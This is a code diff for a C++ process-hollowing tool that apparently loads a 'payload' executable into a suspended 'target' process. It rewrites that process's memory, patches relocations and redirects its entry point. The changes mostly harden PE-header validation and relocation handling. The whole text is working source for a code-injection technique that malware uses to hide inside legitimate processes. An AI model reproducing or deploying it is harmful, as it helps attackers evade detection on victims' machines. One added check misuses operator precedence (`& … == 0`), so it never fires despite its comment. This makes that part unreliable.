@@ -63,7 +63,7 @@ void CloseHandleAndCleanPayload(const LPPROCESS_INFORMATION lpPI,
     }
 }
 
-LPVOID GetFileContent(const LPSTR& lpSourceImage) {
+LPVOID GetFileContent(const LPSTR& lpSourceImage, DWORD& dwFileSize) {
     std::cout << "\n=====GET PAYLOAD CONTENT=====\n";
 
     const HANDLE hFile = CreateFileA(lpSourceImage, GENERIC_READ, 0, NULL,
@@ -77,7 +77,7 @@ LPVOID GetFileContent(const LPSTR& lpSourceImage) {
 
     std::cout << "\n[+] Payload's handle: " << hFile;
 
-    DWORD dwFileSize = GetFileSize(hFile, NULL);
+    dwFileSize = GetFileSize(hFile, NULL);
     if (dwFileSize == INVALID_FILE_SIZE) {
         std::cout << "\nRead file size failed.";
         CloseHandle(hFile);
@@ -86,22 +86,22 @@ LPVOID GetFileContent(const LPSTR& lpSourceImage) {
 
     std::cout << "\n[+] Payload's size (on disk): " << dwFileSize;
 
-    const LPVOID hFileContent =
+    const LPVOID lpFileContent =
         HeapAlloc(GetProcessHeap(), 0,
                   (SIZE_T)dwFileSize);  // Allocate heap for the payload
-    if (hFileContent == NULL) {
+    if (lpFileContent == NULL) {
         std::cout << "\nHeap allocation failed.";
-        HeapFree(GetProcessHeap(), 0, hFileContent);
+        HeapFree(GetProcessHeap(), 0, lpFileContent);
         CloseHandle(hFile);
         return nullptr;
     }
 
-    std::cout << "\n[+] Payload's handle on heap: " << hFileContent;
+    std::cout << "\n[+] Payload's handle on heap: " << lpFileContent;
 
     DWORD dwReadByte;
-    if (!ReadFile(hFile, hFileContent, dwFileSize, &dwReadByte, nullptr)) {
+    if (!ReadFile(hFile, lpFileContent, dwFileSize, &dwReadByte, nullptr)) {
         std::cout << "\nRead payload failed. Error code: " << GetLastError();
-        HeapFree(GetProcessHeap(), 0, hFileContent);
+        HeapFree(GetProcessHeap(), 0, lpFileContent);
         CloseHandle(hFile);
         return nullptr;
     }
@@ -109,23 +109,70 @@ LPVOID GetFileContent(const LPSTR& lpSourceImage) {
     std::cout << "\n[+] Byte read: " << dwReadByte;
 
     CloseHandle(hFile);
-    return hFileContent;
+    return lpFileContent;
 }
 
-bool isValidPE(const LPVOID lpPayload) {
+bool isValidPE(const LPVOID lpPayload, const DWORD dwFileSize) {
     std::cout << "\n=====VALIDATE PE=====\n";
+
+    if ((SIZE_T)dwFileSize < sizeof(IMAGE_DOS_HEADER)) {
+        std::cout << "\nFile size is smaller than DOS Header's size.";
+        return false;
+    }
+
+    std::cout << "\n[1]";
 
     const auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)((uintptr_t)lpPayload);
 
+    if (lpImageDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
+        std::cout << "\nThe payload is not an actual PE file.";
+        return false;
+    }
+    std::cout << "\n[2]";
+
+    LONG ntAddr = lpImageDOSHeader->e_lfanew;
+    // There should be enough space for NT->Signature and NT->FileHeader
+    if (ntAddr < 0 || ntAddr > (LONG)dwFileSize ||
+        ((LONG)dwFileSize - ntAddr) <
+            sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER)) {
+        std::cout << "\ne_lfanew is not valid.";
+        return false;
+    }
+    std::cout << "\n[3]";
+
     const auto lpImageNTHeaders =
-        (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader +
-                            lpImageDOSHeader->e_lfanew);
+        (PIMAGE_NT_HEADERS)((uintptr_t)lpImageDOSHeader + ntAddr);
 
-    std::cout << "\nSignature: " << lpImageNTHeaders->Signature;
+    if (lpImageNTHeaders->Signature != IMAGE_NT_SIGNATURE) {
+        std::cout << "\nThe payload is not a PE image.";
+        return false;
+    }
 
-    if (lpImageNTHeaders->Signature == IMAGE_NT_SIGNATURE) return true;
+    std::cout << "\n[4]";
 
-    return false;
+    // Characteristics is a bitmask, therefore need to use &
+    if (lpImageNTHeaders->FileHeader.Characteristics &
+        IMAGE_FILE_EXECUTABLE_IMAGE == 0) {
+        std::cout << "\nThis payload is not executable.";
+        return false;
+    }
+    std::cout << "\n[5]";
+
+    if (ntAddr + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +
+            lpImageNTHeaders->FileHeader.SizeOfOptionalHeader >
+        dwFileSize) {
+        std::cout << "\nInvalid Optional Header's size.";
+        return false;
+    }
+    std::cout << "\n[6]";
+
+    if (lpImageNTHeaders->FileHeader.SizeOfOptionalHeader < sizeof(WORD)) {
+        std::cout << "\nThe size of Optional Header is not large enough for "
+                     "\"Magic\" member";
+        return false;
+    }
+    std::cout << "\n[7]";
+    return true;
 }
 
 ProcessAddressInformation GetProcAddrInfo32(const LPPROCESS_INFORMATION lpPI) {
@@ -139,7 +186,7 @@ ProcessAddressInformation GetProcAddrInfo32(const LPPROCESS_INFORMATION lpPI) {
         return ProcessAddressInformation{nullptr, nullptr};
     }
 
-    // Ebx is where the PEB address is in x86
+    // Ebx is where the PEB address is in x86 after suspended
     // Address to ImageBaseAddress = PEB_addr + 0x8
     PVOID ptrToImgBaseAddr = (PVOID)((uintptr_t)ctx.Ebx + 0x8);
 
@@ -167,7 +214,7 @@ ProcessAddressInformation GetProcAddrInfo64(const LPPROCESS_INFORMATION lpPI) {
         return ProcessAddressInformation{nullptr, nullptr};
     }
 
-    // Rdx is where the PEB address is in x64
+    // Rdx is where the PEB address is in x64 after suspended
     // Address of ImageBaseAddress = PEB_addr + 0x10
     PVOID ptrToImgBaseAddr = (PVOID)((uintptr_t)ctx.Rdx + 0x10);
 
@@ -351,7 +398,8 @@ bool RunPE32(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
     }
 
     // Update Entry Point
-    // In x86, Eax is the Entry Point register
+    // During suspended time, in x86, Eax is the Entry Point register of the
+    // process
     ctx.Eax = (DWORD)((uintptr_t)lpAllocAddress +
                       lpNT->OptionalHeader.AddressOfEntryPoint);
 
@@ -446,7 +494,8 @@ bool RunPE64(const LPPROCESS_INFORMATION lpPI, const LPVOID lpFileContent) {
     }
 
     // Update Entry Point - Rcx
-    // In x64, Rcx is the Entry Point register
+    // During suspended time, in x64, Rcx is the Entry Point register of the
+    // process
     ctx.Rcx =
         (DWORD64)lpAllocAddress + lpNT->OptionalHeader.AddressOfEntryPoint;
 
@@ -571,6 +620,16 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
                                     lpNT->FileHeader.SizeOfOptionalHeader +
                                     (i * sizeof(IMAGE_SECTION_HEADER)));
 
+        // Check if the size of the section is larger than the allocated space
+        // lpImageSectionHeader->VirtualAddress is RVA, not VA
+        if ((lpImageSectionHeader->VirtualAddress +
+             lpImageSectionHeader->Misc.VirtualSize) >
+            (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
+            std::cout
+                << "\nThe section's size is larger than the allocated space.";
+            return false;
+        }
+
         if (bNeedReloc &&
             ImgDataReloc.VirtualAddress >=
                 (uintptr_t)lpImageSectionHeader->VirtualAddress &&
@@ -628,10 +687,15 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
                                                            lpFileContent +
                                                        lpRelocSection
                                                            ->PointerToRawData +
+                                                       (ImgDataReloc
+                                                            .VirtualAddress -
+                                                        lpRelocSection
+                                                            ->VirtualAddress) +
                                                        dwRelocOffset);
                 dwRelocOffset += 0x2;
 
-                if (RelocEntry->Type == 0) continue;
+                // Padding entry, no need to intervene
+                if (RelocEntry->Type == IMAGE_REL_BASED_ABSOLUTE) continue;
 
                 const auto ptrToTheAddressToFix = (uintptr_t)lpAllocAddress +
                                                   RelocBlock->VirtualAddress +
@@ -648,7 +712,15 @@ bool RunPEReloc32(const LPPROCESS_INFORMATION lpPI,
                     return false;
                 }
 
-                dwFixedAddress += DeltaImageBase;
+                if (RelocEntry->Type == IMAGE_REL_BASED_HIGHLOW) {
+                    dwFixedAddress += static_cast<DWORD>(DeltaImageBase);
+                }
+
+                else {
+                    std::cout << "\nRelocation type not supported. Error code: "
+                              << GetLastError();
+                    return false;
+                }
 
                 if (!WriteProcessMemory(
                         lpPI->hProcess, (LPVOID)ptrToTheAddressToFix,
@@ -789,15 +861,16 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
                   << (SIZE_T)lpNT->OptionalHeader.SizeOfImage;
         // Check if the size of the section is larger than the allocated space
         // lpImageSectionHeader->VirtualAddress is RVA, not VA
-        if (bNeedReloc && (lpImageSectionHeader->VirtualAddress +
-                           lpImageSectionHeader->Misc.VirtualSize) >
-                              (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
+        if ((lpImageSectionHeader->VirtualAddress +
+             lpImageSectionHeader->Misc.VirtualSize) >
+            (SIZE_T)lpNT->OptionalHeader.SizeOfImage) {
             std::cout
                 << "\nThe section's size is larger than the allocated space.";
             return false;
         }
 
-        if (ImgDataReloc.VirtualAddress >=
+        if (bNeedReloc &&
+            ImgDataReloc.VirtualAddress >=
                 (uintptr_t)lpImageSectionHeader->VirtualAddress &&
             ImgDataReloc.VirtualAddress <
                 (lpImageSectionHeader->VirtualAddress +
@@ -860,10 +933,15 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
                                                            lpFileContent +
                                                        lpRelocSection
                                                            ->PointerToRawData +
+                                                       (ImgDataReloc
+                                                            .VirtualAddress -
+                                                        lpRelocSection
+                                                            ->VirtualAddress) +
                                                        dwRelocOffset);
                 dwRelocOffset += 0x2;
 
-                if (RelocEntry->Type == 0) continue;
+                // Padding entry, no need to intervene
+                if (RelocEntry->Type == IMAGE_REL_BASED_ABSOLUTE) continue;
 
                 const auto ptrToTheAddressToFix = (uintptr_t)lpAllocAddress +
                                                   RelocBlock->VirtualAddress +
@@ -878,12 +956,21 @@ bool RunPEReloc64(const LPPROCESS_INFORMATION lpPI,
                     return false;
                 }
 
-                dwFixedAddress += DeltaImageBase;
+                if (RelocEntry->Type == IMAGE_REL_BASED_DIR64) {
+                    dwFixedAddress += DeltaImageBase;
+                }
+
+                else {
+                    std::cout << "\nRelocation type not supported. Error code: "
+                              << GetLastError();
+                    return false;
+                }
 
                 if (!WriteProcessMemory(
                         lpPI->hProcess, (LPVOID)ptrToTheAddressToFix,
                         (LPVOID)&dwFixedAddress, sizeof(DWORD64), NULL)) {
-                    std::cout << "\nCannot patch new address.";
+                    std::cout << "\nCannot patch new address. Error code: "
+                              << GetLastError();
                     return false;
                 }
             }
@@ -947,14 +1034,17 @@ int main(const int argc, char* argv[]) {
     std::cout << "\n[+] Payload: " << lpSourceImage;
     std::cout << "\n[+] Target: " << lpTargetProcess;
 
-    const LPVOID lpFileContent =
-        GetFileContent(lpSourceImage);  // Assign payload on RAM and get address
+    DWORD dwFileSize;
+
+    const LPVOID lpFileContent = GetFileContent(
+        lpSourceImage, dwFileSize);  // Assign payload on RAM and get address
     if (lpFileContent == nullptr) {
         std::cout << "\nGet address of payload on RAM failed.";
         return -1;
     }
 
-    if (!isValidPE(lpFileContent))  // Check if the payload is a valid PE file
+    if (!isValidPE(lpFileContent,
+                   dwFileSize))  // Check if the payload is a valid PE file
     {
         std::cout << "\nThe payload is not a PE file.";
         return -1;
@@ -980,9 +1070,9 @@ int main(const int argc, char* argv[]) {
         return -1;
     }
 
-    USHORT ProcessMachine, TargetMachine;
+    USHORT ProcessMachine, NativeMachine;
     if (!IsWow64Process2(PI.hProcess, &ProcessMachine,
-                         &TargetMachine))  // WOW64: x86 emulator on x64 arch
+                         &NativeMachine))  // WOW64: x86 emulator on x64 arch
     {
         std::cout << "\nGetting target's arch failed.";
         CloseProcessAndCleanPayload(&PI, lpFileContent);
@@ -993,10 +1083,9 @@ int main(const int argc, char* argv[]) {
     if (ProcessMachine == IMAGE_FILE_MACHINE_I386)
         bTarget32 = true;
     else if (ProcessMachine == IMAGE_FILE_MACHINE_UNKNOWN) {
-        if (TargetMachine == IMAGE_FILE_MACHINE_AMD64 ||
-            TargetMachine == IMAGE_FILE_MACHINE_IA64) {
+        if (NativeMachine == IMAGE_FILE_MACHINE_AMD64) {
             bTarget32 = false;
-        } else if (TargetMachine == IMAGE_FILE_MACHINE_I386) {
+        } else if (NativeMachine == IMAGE_FILE_MACHINE_I386) {
             bTarget32 = true;
         } else {
             std::cout << "\nTarget's architecture is not supported.";
@@ -1079,6 +1168,8 @@ int main(const int argc, char* argv[]) {
     if (dwTargetSubsystem != dwPayloadSubsystem) {
         std::cout << "\nTarget's subsystem and payload's subsystem is not "
                      "compatible.";
+        CloseProcessAndCleanPayload(&PI, lpFileContent);
+        return -1;
     }
 
     /***********************************/
